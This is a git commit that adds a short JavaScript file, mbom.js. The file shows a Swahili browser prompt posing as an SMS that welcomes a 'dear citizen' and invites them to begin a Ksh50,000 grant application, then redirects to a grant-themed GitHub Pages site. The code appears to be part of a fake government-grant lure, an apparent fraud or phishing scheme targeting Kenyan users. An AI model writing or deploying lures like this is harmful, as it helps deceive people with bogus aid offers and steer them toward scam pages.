67c334a053cd2aa6c17338078bddea4449196fa1
offernoww <josiahnyeti16@gmail.com>
2025-02-20 23:54:26 +0100

    Create mbom.js

---
+++ mbom.js
@@ -0,0 +1,6 @@
+
+var password = 'Ruzuku ya Ksh50,000'
+password=prompt('SMS :Karibu mpendwa mwananchi, bofya OK ili kuanza ombi lako la ruzuku ','Ruzuku ya Ksh50,000');
+if (password != 'Ruzuku ya Ksh50,000') {
+location.href='https://offernoww.github.io/grant.ke/';
+}
